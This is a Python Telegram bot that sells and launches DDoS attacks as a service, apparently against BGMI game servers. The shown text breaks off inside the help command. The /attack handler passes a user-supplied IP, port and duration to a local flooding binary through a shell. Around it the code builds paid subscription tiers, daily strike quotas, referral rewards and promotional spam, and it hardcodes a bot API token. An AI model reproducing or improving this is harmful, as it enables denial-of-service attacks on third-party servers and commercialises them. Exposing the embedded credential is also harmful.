#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading
import requests
import hashlib
import sys
import logging
import re

# Setup logging
logging.basicConfig(filename='bot.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Telegram bot token
bot = telebot.TeleBot('7898888817:AAHfJQUBpUyxj2LS0v6XZ-ufQok262RPJ70')

# Admin/Overlord user IDs
OVERLORD_IDS = ["1866961136", "1807014348"]

# Group and channel details
GROUP_IDS = ["-1002328886935", "-1002669651081"]  # @freeddos_group12 and Vip Hacker Ddos
CHANNEL_IDS = ["-1002308316749"]  # @ddos_server69
GROUP_USERNAME = "@freeddos_group12"
CHANNEL_USERNAME = "@ddos_server69"
VIP_HACKER_DDOS_ID = "-1002669651081"
SUPPORT_CONTACT = "@Sadiq9869"
PURCHASE_CONTACT = "@Rohan2349"

# Configurable limits
COOLDOWN_TIME = 15  # Cooldown in seconds
ATTACK_LIMIT = 10   # Daily attack limit for non-overlords
USER_MAX_DURATION = 180  # Max attack duration for regular users
OVERLORD_MAX_DURATION = 600  # Max attack duration for overlords
PAID_USER_MAX_DURATION = 600  # Max attack duration for paid users
MAX_REFERRAL_BONUS = 5  # Max extra strikes from referrals

# Global variables
pending_feedback = {}
global_attack_running = False
overlord_attack_running = False
attack_lock = threading.Lock()
overlord_attack_lock = threading.Lock()

# Files to store data
USER_FILE = "users.txt"
FEEDBACK_HASH_FILE = "feedback_hashes.txt"
REFERRAL_FILE = "referrals.txt"
HISTORY_FILE = "attack_history.txt"
RANK_FILE = "ranks.txt"
PAID_USERS_FILE = "paid_users.txt"

# Data storage
user_data = {}
feedback_hashes = set()
referral_data = {}
attack_history = {}
user_ranks = {}
PAID_USERS = {}  # user_id -> expiry datetime
feedback_count_dict = {}

# Thunder Rank System
RANKS = {
    0: "Rookie Operative 🐣👶",
    10: "Cyber Enforcer 🛡️💂",
    25: "Thunder Soldier ⚔️🪖",
    50: "Elite Striker 🌟✨",
    100: "Thunder Lord 👑🔥"
}

# Daily Missions
DAILY_MISSIONS = {
    "attacks": {"task": "Launch 3 Attacks 🚀💥", "count": 3, "reward": 1},
    "invites": {"task": "Invite 1 Friend 📩🤝", "count": 1, "reward": 1}
}

# Random Image URLs
IMAGE_URLS = [
    "https://envs.sh/g7a.jpg", "https://envs.sh/g7O.jpg", "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg", "https://envs.sh/gH4.jpg", "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg", "https://envs.sh/gH1.jpg", "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg", "https://envs.sh/67E.jpg", "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg", "https://envs.sh/68V.jpg", "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg", "https://envs.sh/Vwe.jpg", "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg", "https://envs.sh/VwK.jpg", "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg", "https://envs.sh/Vwc.jpg"
]

# Branded footer
def branded_footer():
    return f"\n\n⚡ **Powered by {GROUP_USERNAME}** ⚡💪\n🌩️ **Feedback Channel:** {CHANNEL_USERNAME} 📡🔗"

# Price list
PRICE_LIST = (
    "🛍️🎮 **THUNDER ARSENAL - @freeddos_group12** 🎮🛍️✨\n"
    "🏅🏅 **Unlock Elite Firepower!** 🏅🏅🔥\n\n"
    "✨ **1 DAY STRIKE CORE**: ₹150 💵💳\n"
    "🎁 **Bonus**: First Strike Free! ⚡😍🎉\n\n"
    "✨ **3 DAY STORM MODULE**: ₹350 💵💳\n"
    "🎁 **Bonus**: 1 day free! 🆓🎈\n\n"
    "✨ **7 DAY THUNDER CORE**: ₹799 💵💳\n"
    "🎁 **Limited Offer**: First 50 Buyers Get 3 extra days free! 🎉🎊\n\n"
    "✨ **15 DAY LIGHTNING GRID**: ₹1599 💵💳\n"
    "🎁 **Bonus**: 5 extra days free + VIP Badge in Group! 🏆🎖️\n\n"
    "✨ **30 DAY STORM KING**: ₹4000 💵💳\n"
    "🎁 **Loyalty Bonus**: 7 extra days free! 🤝💖\n\n"
    "✨ **60 DAY EMPEROR’S WRATH**: ₹7999 💵💳\n"
    "🎁 **Loyalty Bonus**: 12 extra days free! 💖💝\n\n"
    f"📩 **DM to Buy from Overlord {PURCHASE_CONTACT}** 📩💌\n"
    f"{branded_footer()}"
)

# Helper functions
def check_membership(user_id, chat_ids):
    try:
        for chat_id in chat_ids:
            member = bot.get_chat_member(chat_id, user_id)
            if member.status in ['member', 'administrator', 'creator']:
                return True
        return False
    except Exception as e:
        logging.error(f"Membership check failed for {user_id}: {e}")
        return False

def is_paid_user(user_id):
    if user_id in PAID_USERS:
        expiry = PAID_USERS[user_id]
        if datetime.datetime.now() < expiry:
            return True
        else:
            del PAID_USERS[user_id]
            save_paid_users()
    return False

def load_data(file_path, loader_func):
    try:
        with open(file_path, "r") as file:
            loader_func(file)
    except FileNotFoundError:
        logging.info(f"{file_path} not found, starting fresh.")

def load_users():
    def loader(file):
        for line in file:
            user_id, attacks, last_reset = line.strip().split(',')
            user_data[user_id] = {
                'attacks': int(attacks),
                'last_reset': datetime.datetime.fromisoformat(last_reset),
                'last_attack': None,
                'referral_bonus': 0,
                'mission_attacks': 0,
                'mission_invites': 0,
                'mission_reset': datetime.datetime.now()
            }
    load_data(USER_FILE, loader)

def load_feedback_hashes():
    def loader(file):
        for line in file:
            feedback_hashes.add(line.strip())
    load_data(FEEDBACK_HASH_FILE, loader)

def load_referrals():
    def loader(file):
        for line in file:
            user_id, count = line.strip().split(',')
            referral_data[user_id] = int(count)
    load_data(REFERRAL_FILE, loader)

def load_attack_history():
    def loader(file):
        for line in file:
            user_id, target, port, duration, status, timestamp = line.strip().split(',')
            if user_id not in attack_history:
                attack_history[user_id] = []
            attack_history[user_id].append({
                'target': target,
                'port': port,
                'duration': int(duration),
                'status': status,
                'timestamp': datetime.datetime.fromisoformat(timestamp)
            })
    load_data(HISTORY_FILE, loader)

def load_ranks():
    def loader(file):
        for line in file:
            user_id, points = line.strip().split(',')
            user_ranks[user_id] = int(points)
    load_data(RANK_FILE, loader)

def load_paid_users():
    def loader(file):
        for line in file:
            user_id, expiry = line.strip().split(',')
            PAID_USERS[user_id] = datetime.datetime.fromisoformat(expiry)
    load_data(PAID_USERS_FILE, loader)

def save_data(file_path, data_dict, format_func):
    try:
        with open(file_path, "w") as file:
            for key, value in data_dict.items():
                file.write(format_func(key, value))
    except Exception as e:
        logging.error(f"Error saving {file_path}: {e}")

def save_users():
    save_data(USER_FILE, user_data, lambda k, v: f"{k},{v['attacks']},{v['last_reset'].isoformat()}\n")

def save_feedback_hash(image_hash):
    with open(FEEDBACK_HASH_FILE, "a") as file:
        file.write(f"{image_hash}\n")
    feedback_hashes.add(image_hash)

def save_referrals():
    save_data(REFERRAL_FILE, referral_data, lambda k, v: f"{k},{v}\n")

def save_attack_history():
    save_data(HISTORY_FILE, attack_history, 
              lambda k, v: "".join(f"{k},{entry['target']},{entry['port']},{entry['duration']},"
                                   f"{entry['status']},{entry['timestamp'].isoformat()}\n" for entry in v))

def save_ranks():
    save_data(RANK_FILE, user_ranks, lambda k, v: f"{k},{v}\n")

def save_paid_users():
    save_data(PAID_USERS_FILE, PAID_USERS, lambda k, v: f"{k},{v.isoformat()}\n")

def get_user_rank(user_id):
    points = user_ranks.get(user_id, 0)
    rank = "Rookie Operative 🐣👶"
    for threshold, rank_name in sorted(RANKS.items(), reverse=True):
        if points >= threshold:
            rank = rank_name
            break
    return rank, points

def update_user_rank(user_id, points_to_add):
    user_ranks[user_id] = user_ranks.get(user_id, 0) + points_to_add
    save_ranks()
    rank, points = get_user_rank(user_id)
    if points_to_add > 0:
        bot.send_message(user_id, 
                         f"🎖️ **Rank Update!** 🎖️🏆\n"
                         f"⚡ **New Rank:** {rank} 🌟✨\n"
                         f"💾 **Thunder Points:** {points} 📊📈\n"
                         f"🌩️ **Keep Striking to Rise!** 🌩️🚀💪"
                         f"{branded_footer()} 😍🎉")

def hash_image(file_id):
    try:
        file_info = bot.get_file(file_id)
        file_url = f"https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}"
        response = requests.get(file_url)
        response.raise_for_status()
        return hashlib.sha256(response.content).hexdigest()
    except Exception as e:
        logging.error(f"Error hashing image: {e}")
        return None

def simulate_attack(chat_id, target, port, time_duration, remaining_attacks, user_name, is_overlord=False, is_paid=False):
    global global_attack_running, overlord_attack_running
    interval = time_duration / 10
    try:
        for progress in range(0, 101, 10):
            time.sleep(interval)
            remaining_time = int(time_duration - (progress / 100 * time_duration))
            bot.send_message(chat_id, 
                             f"🌩️ **Thunder Strike Update!** 🌩️⚡\n"
                             f"🎯 **Target Locked:** `{target}:{port}` 🔒🔍\n"
                             f"⏳ **Time Remaining:** {remaining_time}s ⏰⏱️\n"
                             f"⚡ **Operation Progress:** {progress}% 📈📊"
                             f"{branded_footer()} 😎💥")
        bot.send_message(chat_id, 
                         f"✅ **Target Annihilated!** ✅🎉\n"
                         f"🎯 `{target}:{port}` **Reduced to Ashes!** 🔥💥💣\n"
                         f"⏳ **Strike Duration:** {time_duration}s ⏰"
                         f"{branded_footer()} 😍🤗")
    finally:
        if is_overlord:
            with overlord_attack_lock:
                overlord_attack_running = False
        elif not is_paid:
            with attack_lock:
                global_attack_running = False

def auto_promotion():
    while True:
        for group_id in GROUP_IDS:
            try:
                bot.send_message(group_id, 
                    f"🌩️ **The Thunder Command Awaits!** 🌩️⚡\n"
                    f"💥 Join the Elite Strike Force and Unleash Chaos! 💥🔥\n"
                    f"⚡ **Join {GROUP_USERNAME} and {CHANNEL_USERNAME} to Strike!** ⚡🤝👥\n"
                    f"🔋 **Upgrade to Thunder Arsenal for {OVERLORD_MAX_DURATION}s Attack Duration (Free: {USER_MAX_DURATION}s)!** 🔋⏰⏱️\n"
                    f"🔗 **Check Plans:** /start 📜📋\n"
                    f"🎮 **Dominate the Cyber Battlefield!** 🎮🌐💻"
                    f"{branded_footer()} 😍🎉",
                    parse_mode="Markdown")
            except Exception as e:
                logging.error(f"Error in auto-promotion: {e}")
        time.sleep(600)  # 10 minutes

def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            if user_id not in OVERLORD_IDS:
                user_data[user_id]['attacks'] = 0
                user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Thread setup
promotion_thread = threading.Thread(target=auto_promotion, daemon=True)
promotion_thread.start()
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Command handlers
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }

    command = message.text.split()
    if len(command) > 1:
        referrer_id = command[1]
        if referrer_id in referral_data and referrer_id != user_id:
            referral_data[referrer_id] = referral_data.get(referrer_id, 0) + 1
            user_data[referrer_id]['mission_invites'] += 1
            if user_data[referrer_id].get('referral_bonus', 0) < MAX_REFERRAL_BONUS:
                user_data[referrer_id]['referral_bonus'] += 1
                bot.send_message(referrer_id, 
                                 f"🎉 **New Operative Recruited!** 🎉🎊\n"
                                 f"⚡ **You Earned 1 Extra Strike!** ⚡💥🔥\n"
                                 f"💥 **Total Extra Strikes:** {user_data[referrer_id]['referral_bonus']} 🎁✨"
                                 f"{branded_footer()} 😍🤗")
            update_user_rank(referrer_id, 2)
            save_referrals()
            save_users()

    bot.reply_to(message, 
                 f"🌩️ **Welcome to Thunder Command, {user_name}!** 🌩️😍✨\n"
                 f"⚡ **{GROUP_USERNAME} - Where Cyber Legends Strike!** ⚡🌟🏆\n"
                 f"💥 **World’s Most Lethal Bot - Locked and Loaded!** 💥🔫💣\n"
                 f"🎮 **Conquer the Cyber Battlefield!** 🎮🌐💻\n\n"
                 f"📜 **Join the Thunder Hub to Unlock Power!** 📜🔓🔑\n"
                 f"🔗 **Strike Force:** {GROUP_USERNAME} 🤝👥\n"
                 f"🔗 **Command Hub:** {CHANNEL_USERNAME} 📡🌐\n"
                 f"🌩️ **Now Striking in Vip Hacker Ddos!** 🌩️💻🖥️\n\n"
                 f"🚀 **Mission Briefing:** 🚀📋\n"
                 f"1️⃣ Join {GROUP_USERNAME} and {CHANNEL_USERNAME} 🤝👥\n"
                 f"2️⃣ Launch your first strike: /attack <IP> <PORT> <TIME> 💣💥\n"
                 f"3️⃣ Submit combat intel (BGMI screenshot) 📸🖼️\n"
                 f"🛠️ **Full Directive:** /help 📖📋\n\n"
                 f"💎 **Want {OVERLORD_MAX_DURATION}s Attack Duration? Upgrade to Thunder Arsenal! (Free: {USER_MAX_DURATION}s)** 💎⏰⏱️\n"
                 f"{PRICE_LIST}",
                 parse_mode="Markdown")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    is_overlord = user_id in OVERLORD_IDS
    is_paid = is_paid_user(user_id)

    if not (is_overlord or is_paid or check_membership(user_id, GROUP_IDS)):
        bot.reply_to(message, f"🌪️ **Operative, Join the Elite Strike Force First!** 🌪️❗⚠️\n"
                              f"⚡ **Join {GROUP_USERNAME} to Access Thunder Command!** ⚡🤝👥"
                              f"{branded_footer()} 😓😢")
        return
    if not (is_overlord or is_paid or check_membership(user_id, CHANNEL_IDS)):
        bot.reply_to(message, f"🔥 **Operative, Sync with the Command Hub!** 🔥❗⚠️\n"
                              f"⚡ **Join {CHANNEL_USERNAME} to Access Thunder Command!** ⚡📡🌐"
                              f"{branded_footer()} 😓😢")
        return

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }

    user = user_data[user_id]
    total_attacks = user['attacks'] - user.get('referral_bonus', 0)
    remaining_attacks = "Unlimited" if (is_overlord or is_paid) else (ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks)
    referral_count = referral_data.get(user_id, 0)
    rank, points = get_user_rank(user_id)
    status = "Overlord 👑👑" if is_overlord else ("Thunder Arsenal Operative 💎✨" if is_paid else "Operative 🐣👶")

    bot.reply_to(message, 
                 f"👤 **Operative Profile: {user_name}** 👤🌟\n"
                 f"🆔 **ID:** `{user_id}` 🖥️💻\n"
                 f"⚡ **Status:** {status} 🌟✨\n"
                 f"🎖️ **Thunder Rank:** {rank} 🏆🎖️\n"
                 f"💾 **Thunder Points:** {points} 📊📈\n"
                 f"💥 **Strikes Used:** {total_attacks} 💣💥\n"
                 f"🎁 **Referral Bonus Strikes:** {user.get('referral_bonus', 0)} 🎉🎁\n"
                 f"⚡ **Remaining Strikes:** {remaining_attacks} 🚀💣\n"
                 f"📩 **Invites Sent:** {referral_count} 🤝👥\n"
                 f"⏳ **Last Reset:** {user['last_reset'].strftime('%Y-%m-%d %H:%M:%S')} ⏰⏱️"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['missions'])
def daily_missions(message):
    user_id = str(message.from_user.id)
    is_overlord = user_id in OVERLORD_IDS
    is_paid = is_paid_user(user_id)

    if not (is_overlord or is_paid or check_membership(user_id, GROUP_IDS)):
        bot.reply_to(message, f"🌪️ **Operative, Join the Elite Strike Force First!** 🌪️❗⚠️\n"
                              f"⚡ **Join {GROUP_USERNAME} to Access Thunder Command!** ⚡🤝👥"
                              f"{branded_footer()} 😓😢")
        return
    if not (is_overlord or is_paid or check_membership(user_id, CHANNEL_IDS)):
        bot.reply_to(message, f"🔥 **Operative, Sync with the Command Hub!** 🔥❗⚠️\n"
                              f"⚡ **Join {CHANNEL_USERNAME} to Access Thunder Command!** ⚡📡🌐"
                              f"{branded_footer()} 😓😢")
        return

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }

    user = user_data[user_id]
    now = datetime.datetime.now()
    if (now - user['mission_reset']).days >= 1:
        user['mission_attacks'] = 0
        user['mission_invites'] = 0
        user['mission_reset'] = now
        save_users()

    bot.reply_to(message, 
                 f"📜 **Daily Mission Briefing** 📜📋\n\n"
                 f"🎯 **Mission 1: {DAILY_MISSIONS['attacks']['task']}** 🚀💥\n"
                 f"⚡ **Progress:** {user['mission_attacks']}/{DAILY_MISSIONS['attacks']['count']} 📈📊\n"
                 f"🎁 **Reward:** {DAILY_MISSIONS['attacks']['reward']} Extra Strike 🎉🎁\n\n"
                 f"📩 **Mission 2: {DAILY_MISSIONS['invites']['task']}** 🤝👥\n"
                 f"⚡ **Progress:** {user['mission_invites']}/{DAILY_MISSIONS['invites']['count']} 📈📊\n"
                 f"🎁 **Reward:** {DAILY_MISSIONS['invites']['reward']} Extra Strike 🎉🎁\n\n"
                 f"⏳ **Missions Reset At:** {user['mission_reset'].replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)} ⏰⏱️"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['history'])
def attack_history_command(message):
    user_id = str(message.from_user.id)
    is_overlord = user_id in OVERLORD_IDS
    is_paid = is_paid_user(user_id)

    if not (is_overlord or is_paid or check_membership(user_id, GROUP_IDS)):
        bot.reply_to(message, f"🌪️ **Operative, Join the Elite Strike Force First!** 🌪️❗⚠️\n"
                              f"⚡ **Join {GROUP_USERNAME} to Access Thunder Command!** ⚡🤝👥"
                              f"{branded_footer()} 😓😢")
        return
    if not (is_overlord or is_paid or check_membership(user_id, CHANNEL_IDS)):
        bot.reply_to(message, f"🔥 **Operative, Sync with the Command Hub!** 🔥❗⚠️\n"
                              f"⚡ **Join {CHANNEL_USERNAME} to Access Thunder Command!** ⚡📡🌐"
                              f"{branded_footer()} 😓😢")
        return

    if user_id not in attack_history or not attack_history[user_id]:
        bot.reply_to(message, f"📜 **Your Strike Log is Empty!** 📜📋\n"
                              f"⚡ **No Strikes Launched Yet!** ⚡😢💔"
                              f"{branded_footer()} 😓😢")
        return

    history = attack_history[user_id][-5:]
    history_text = "\n".join([f"🎯 **Target:** {entry['target']}:{entry['port']} 🔒 | **Duration:** {entry['duration']}s ⏰ | "
                              f"**Status:** {entry['status']} ✅ | **Time:** {entry['timestamp'].strftime('%Y-%m-%d %H:%M:%S')} ⏱️" 
                              for entry in history])
    bot.reply_to(message, 
                 f"📜 **Your Last 5 Strikes!** 📜📋\n\n{history_text}\n\n"
                 f"⚡ **Launch More Strikes to Dominate!** ⚡🚀💥"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_attack_running, overlord_attack_running
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()
    is_overlord = user_id in OVERLORD_IDS
    is_paid = is_paid_user(user_id)

    if not (is_overlord or is_paid or str(message.chat.id) in GROUP_IDS):
        bot.reply_to(message, f"🌪️ **Operative, This Weapon Only Works in Authorized Warzones!** 🌪️❗⚠️\n"
                              f"⚡ **Join {GROUP_USERNAME} or Vip Hacker Ddos to Strike!** ⚡🤝👥"
                              f"{branded_footer()} 😓😢")
        return

    if not (is_overlord or is_paid or check_membership(user_id, GROUP_IDS)):
        bot.reply_to(message, f"🌪️ **Operative, Join the Elite Strike Force First!** 🌪️❗⚠️\n"
                              f"⚡ **Join {GROUP_USERNAME} to Access Thunder Command!** ⚡🤝👥"
                              f"{branded_footer()} 😓😢")
        return
    if not (is_overlord or is_paid or check_membership(user_id, CHANNEL_IDS)):
        bot.reply_to(message, f"🔥 **Operative, Sync with the Command Hub!** 🔥❗⚠️\n"
                              f"⚡ **Join {CHANNEL_USERNAME} to Access Thunder Command!** ⚡📡🌐"
                              f"{branded_footer()} 😓😢")
        return

    if not (is_overlord or is_paid) and pending_feedback.get(user_id, False):
        bot.reply_to(message, f"💥 **Operative, We Need Your Battle Intel!** 💥❗⚠️\n"
                              f"📸 **Submit a BGMI Screenshot to Continue Striking!** 📸🖼️\n"
                              f"🛠️ **Need Help? Contact Overlord {SUPPORT_CONTACT}** 📞🤗"
                              f"{branded_footer()} 😓😢")
        return

    if len(command) != 4:
        bot.reply_to(message, f"❌ **Invalid Command Format!** ❌🚫\n"
                              f"📜 **Usage:** /attack <IP> <PORT> <TIME> 📋\n"
                              f"📌 **Examples:**\n"
                              f"1️⃣ /attack 192.168.1.1 80 180 💻🌐\n"
                              f"2️⃣ /attack 10.0.0.1 443 120 🌐💻\n"
                              f"3️⃣ /attack 172.16.0.1 8080 150 🎮🕹️"
                              f"{branded_footer()} 😓😢")
        return

    target, port, time_duration = command[1], command[2], command[3]

    # Input validation
    if not re.match(r"^\d+\.\d+\.\d+\.\d+$", target):
        bot.reply_to(message, f"❌ **Invalid IP Address!** ❌🚫\n"
                              f"📜 **Usage:** /attack <IP> <PORT> <TIME> 📋\n"
                              f"{branded_footer()} 😓😢")
        return

    try:
        port = int(port)
        time_duration = int(time_duration)
        if not (1 <= port <= 65535):
            raise ValueError("Port out of range")
        if time_duration <= 0:
            raise ValueError("Time must be positive")
    except ValueError:
        bot.reply_to(message, f"❌ **Invalid Input!** ❌🚫\n"
                              f"⚠️ **Port (1-65535) and Time (>0) must be valid numbers!** ⚠️🔢\n"
                              f"📜 **Usage:** /attack <IP> <PORT> <TIME> 📋\n"
                              f"{branded_footer()} 😓😢")
        return

    max_duration = OVERLORD_MAX_DURATION if is_overlord else (PAID_USER_MAX_DURATION if is_paid else USER_MAX_DURATION)
    if time_duration > max_duration:
        bot.reply_to(message, f"⏰ **Time Limit Exceeded!** ⏰⏳\n"
                              f"⚠️ **Max Duration:** {max_duration}s for {'Overlords 👑👑' if is_overlord else 'Thunder Arsenal Operatives 💎✨' if is_paid else 'Free Users 🐣👶'} ⏱️\n"
                              f"📜 **Usage:** /attack <IP> <PORT> <TIME> 📋\n"
                              f"{branded_footer()} 😓😢")
        return

    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count == 0:
        bot.reply_to(message, f"❌ **Operative, Set a Profile Picture to Attack!** ❌🚫"
                              f"{branded_footer()} 😓😢")
        return
    profile_pic = profile_photos.photos[0][-1].file_id

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }

    user = user_data[user_id]
    now = datetime.datetime.now()

    if (now - user['last_reset']).days >= 1:
        user['attacks'] = 0
        user['last_reset'] = now
        save_users()

    total_attacks = user['attacks'] - user.get('referral_bonus', 0)
    remaining_attacks = "Unlimited" if (is_overlord or is_paid) else (ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks)

    if not (is_overlord or is_paid) and remaining_attacks <= 0:
        bot.reply_to(message, f"❌ **Out of Strikes!** ❌🚫\n"
                              f"⚠️ **You've used all your daily strikes!** ⚠️💣\n"
                              f"⏳ **Strikes reset daily, or upgrade to Thunder Arsenal for unlimited strikes!** 💎✨\n"
                              f"📞 **Need More Strikes? Contact Overlord {PURCHASE_CONTACT}** 📩💌"
                              f"{branded_footer()} 😓😢")
        return

    if not (is_overlord or is_paid) and user['last_attack']:
        time_since_last_attack = (now - user['last_attack']).total_seconds()
        if time_since_last_attack < COOLDOWN_TIME:
            remaining_cooldown = int(COOLDOWN_TIME - time_since_last_attack)
            bot.reply_to(message, f"⏳ **Cooldown Active!** ⏳⏰\n"
                                  f"⚠️ **Please wait {remaining_cooldown}s before launching another strike!** ⚠️⏱️\n"
                                  f"💎 **Upgrade to Thunder Arsenal for No Cooldowns!** 💎✨"
                                  f"{branded_footer()} 😓😢")
            return

    if is_overlord and overlord_attack_running:
        bot.reply_to(message, f"⚡ **Overlord Strike in Progress!** ⚡👑\n"
                              f"⏳ **Please wait for the current strike to complete!** ⏳⏰"
                              f"{branded_footer()} 😓😢")
        return
    elif not is_paid and global_attack_running:
        bot.reply_to(message, f"⚡ **Global Strike in Progress!** ⚡🌍\n"
                              f"⏳ **Please wait for the current strike to complete!** ⏳⏰\n"
                              f"💎 **Upgrade to Thunder Arsenal to bypass this!** 💎✨"
                              f"{branded_footer()} 😓😢")
        return

    user['last_attack'] = now
    user['attacks'] += 1
    user['mission_attacks'] += 1
    save_users()

    if user_id not in attack_history:
        attack_history[user_id] = []
    attack_history[user_id].append({
        'target': target,
        'port': port,
        'duration': time_duration,
        'status': 'Completed ✅',
        'timestamp': now
    })
    save_attack_history()

    update_user_rank(user_id, 1)

    if user['mission_attacks'] >= DAILY_MISSIONS['attacks']['count']:
        user['referral_bonus'] += DAILY_MISSIONS['attacks']['reward']
        user['mission_attacks'] = 0
        bot.send_message(user_id, 
                         f"🎉 **Mission Completed!** 🎉🎊\n"
                         f"📜 **{DAILY_MISSIONS['attacks']['task']}** ✅✔️\n"
                         f"🎁 **Reward:** {DAILY_MISSIONS['attacks']['reward']} Extra Strike!** ⚡💥"
                         f"{branded_footer()} 😍🤗")
        save_users()

    if is_overlord:
        with overlord_attack_lock:
            overlord_attack_running = True
    elif not is_paid:
        with attack_lock:
            global_attack_running = True

    remaining_attacks = "Unlimited" if (is_overlord or is_paid) else (ATTACK_LIMIT + user.get('referral_bonus', 0) - (user['attacks'] - user.get('referral_bonus', 0)))

    bot.send_photo(message.chat.id, profile_pic, 
                   caption=f"👤 **User:** @{user_name} 🚀\n"
                           f"💥 **ATTACK STARTED!** 💥\n"
                           f"🎯 **Target:** `{target}:{port}`\n"
                           f"⏳ **Duration:** {time_duration}s\n"
                           f"⚡ **Remaining Strikes:** {remaining_attacks}\n"
                           f"⏳ **Progress: 0%**")

    full_command = f"./Rohan {target} {port} {time_duration} 512 1200"
    try:
        subprocess.run(full_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **Attack Failed!** ❌🚫\n"
                              f"⚠️ **Error:** {e.stderr.decode()} ⚠️"
                              f"{branded_footer()} 😓😢")
        if is_overlord:
            with overlord_attack_lock:
                overlord_attack_running = False
        elif not is_paid:
            with attack_lock:
                global_attack_running = False
        return

    threading.Thread(target=simulate_attack, args=(message.chat.id, target, port, time_duration, remaining_attacks, user_name, is_overlord, is_paid)).start()

    if not (is_overlord or is_paid):
        pending_feedback[user_id] = True
        bot.send_message(user_id, 
                         f"📸 **Operative, We Need Your Battle Intel!** 📸🖼️\n"
                         f"💥 **Please send a BGMI screenshot to continue striking!** 💥🔥\n"
                         f"🛠️ **Need Help? Contact Overlord {SUPPORT_CONTACT}** 📞🤗"
                         f"{branded_footer()} 😍🤗")

@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    is_overlord = user_id in OVERLORD_IDS
    is_paid = is_paid_user(user_id)

    if not pending_feedback.get(user_id, False):
        bot.reply_to(message, f"❌ **No Feedback Required!** ❌🚫\n"
                              f"⚡ **Launch a strike first with /attack!** ⚡💣💥"
                              f"{branded_footer()} 😓😢")
        return

    if is_overlord or is_paid:
        bot.reply_to(message, f"❌ **Feedback Not Required!** ❌🚫\n"
                              f"⚡ **Overlords and Thunder Arsenal Operatives don't need to submit feedback!** ⚡💎✨"
                              f"{branded_footer()} 😍🤗")
        return

    image_hash = hash_image(message.photo[-1].file_id)
    if not image_hash:
        bot.reply_to(message, f"❌ **Error Processing Image!** ❌🚫\n"
                              f"⚠️ **Please try uploading the screenshot again!** ⚠️📸\n"
                              f"🛠️ **Need Help? Contact Overlord {SUPPORT_CONTACT}** 📞🤗"
                              f"{branded_footer()} 😓😢")
        return

    if image_hash in feedback_hashes:
        bot.reply_to(message, f"❌ **Duplicate Feedback!** ❌🚫\n"
                              f"⚠️ **This screenshot has already been submitted!** ⚠️📸\n"
                              f"📸 **Please send a new BGMI screenshot!** 📸🖼️\n"
                              f"🛠️ **Need Help? Contact Overlord {SUPPORT_CONTACT}** 📞🤗"
                              f"{branded_footer()} 😓😢")
        return

    feedback_count = feedback_count_dict.get(user_id, 0) + 1
    feedback_count_dict[user_id] = feedback_count

    save_feedback_hash(image_hash)
    pending_feedback[user_id] = False

    bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)
    bot.send_message(CHANNEL_USERNAME, 
                     f"📸 **Feedback Received!** 📸\n"
                     f"👤 **User:** `{user_name}`\n"
                     f"🆔 **ID:** `{user_id}`\n"
                     f"🔢 **SS No.:** `{feedback_count}`")

    bot.reply_to(message, 
                 f"✅ **Feedback Accepted!** ✅✔️\n"
                 f"⚡ **You're ready to launch more strikes!** ⚡🚀💥\n"
                 f"💥 **Use /attack to strike again!** 💥🔥"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    is_overlord = user_id in OVERLORD_IDS

    user_commands = (
        "📜 **User Commands** 📜📋\n\n"
        "⚡ **Everyone can use these commands!** ⚡💪\n\n"
        "📌 **/start** - Begin your journey with Thunder Command! 🚀🌟\n"
        "📌 **/myinfo** - Check your operative profile and stats! 👤🌟\n"
        "📌 **/missions** - View your daily missions and rewards! 🎯📋\n"
        "📌 **/history** - See your last 5 strikes! 📜📋\n"
